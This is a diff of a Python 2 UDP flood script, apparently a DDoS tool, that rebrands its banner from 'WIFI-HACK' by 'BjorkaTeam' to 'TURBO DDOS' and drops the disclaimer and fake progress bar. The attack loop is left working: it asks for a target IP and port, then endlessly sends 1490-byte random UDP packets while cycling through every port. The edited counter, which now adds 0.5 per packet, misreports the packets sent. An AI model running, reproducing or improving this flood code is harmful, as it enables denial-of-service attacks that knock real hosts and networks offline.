@@ -1,4 +1,3 @@
-print ("\033[91m")
 import sys
 import os
 import time
@@ -17,34 +16,23 @@ year = now.year
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 #############
-
+print("\033[92m")
 os.system("clear")
-os.system("figlet WIFI-HACK
-print "Github   : github.com/BjorkaTeam"
-print "Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk,We'll Be Not Responsible For Kind Of Problems"
-print
-ip = raw_input("IP Target : ")
-port = input("Port       : ")
+os.system("figlet TURBO DDOS")
+ip = raw_input("IP   : ")
+port = input("Port : ")
 os.system("clear")
 print("\033[93m")
-os.system("figlet DdoS Attack")
-print("Team : BjorkaTeam")
-print ("\033[92m")
-print "[                    ] 0% "
-time.sleep(5)
-print "[=====               ] 25%"
-time.sleep(5)
-print "[==========          ] 50%"
-time.sleep(5)
-print "[===============     ] 75%"
-time.sleep(5)
-print "[====================] 100%"
-time.sleep(3)
+os.system("figlet Turbo Attack")
+print ("\033[96m")
+print("Load FILE")
+print("")
+time.sleep(2.1)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
-     sent = sent + 1
+     sent = sent + 0.5
      port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     print "Sent File %s"%(sent)
      if port == 65534:
        port = 1
